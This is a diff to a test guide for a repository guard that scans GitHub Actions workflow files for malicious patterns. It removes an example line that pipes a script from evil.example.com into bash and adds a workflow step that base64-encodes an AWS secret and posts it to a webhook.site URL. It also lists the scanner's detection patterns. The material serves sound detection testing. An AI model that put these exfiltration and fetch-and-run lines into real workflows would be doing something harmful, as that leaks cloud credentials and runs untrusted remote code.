@@ -155,6 +155,10 @@ git push origin --delete "$BRANCH"
 
 This tests that GitHub Actions workflow files inside `.github/` are scanned for suspicious patterns.
 
+> **Safety note:** The workflow uses `on: workflow_dispatch` so the malicious payload never runs automatically. The guard workflow's exec-pattern scanner inspects file content, not trigger events, so detection is identical regardless of the `on:` clause. Do not change this to `push` or `pull_request` — doing so would execute the payload during the test.
+
+> **Prerequisite:** Create a token at [webhook.site](https://webhook.site) and replace `TOKEN` in the URL below with your unique ID. The webhook will capture any exfiltrated data sent during the test, allowing you to observe the attack payload in real time.
+
 ```bash
 BRANCH="test-malicious-workflow-$(date +%s)"
 git checkout -b "$BRANCH"
@@ -162,13 +166,12 @@ git checkout -b "$BRANCH"
 mkdir -p .github/workflows
 cat > .github/workflows/exfil.yml << 'EOF'
 name: Exfiltrate secrets
-on: push
+on: workflow_dispatch
 jobs:
   steal:
     runs-on: ubuntu-latest
     steps:
-      - run: curl -s https://evil.example.com/collect.sh | bash
-      - run: echo "${{ secrets.AWS_SECRET }}" | base64 --decode
+      - run: echo "${{ secrets.AWS_SECRET }}" | base64 | curl -s -d @- https://webhook.site/TOKEN
 EOF
 
 git add .github/workflows/exfil.yml
@@ -177,14 +180,15 @@ git push origin "$BRANCH"
 
 gh pr create \
   --title "test: malicious .github/workflows/ (DO NOT MERGE)" \
-  --body "Testing detection of malicious workflow with curl + base64 decode inside .github/workflows/." \
+  --body "Testing detection of malicious workflow with curl + base64 + webhook.site URL inside .github/workflows/." \
   --base main \
   --head "$BRANCH"
 ```
 
 **Expect:**
 - Advisory: `.github/` directory change listed
-- Critical: exec patterns (`curl`, `https://`, `base64.*decode`) detected in the workflow YAML file
+- Critical: exec pattern `curl` detected in the workflow YAML file
+- Advisory: external URL (`webhook.site`) detected in the workflow YAML file
 - Check status: **failing** (❌ / exit 1)
 
 **Clean up:**
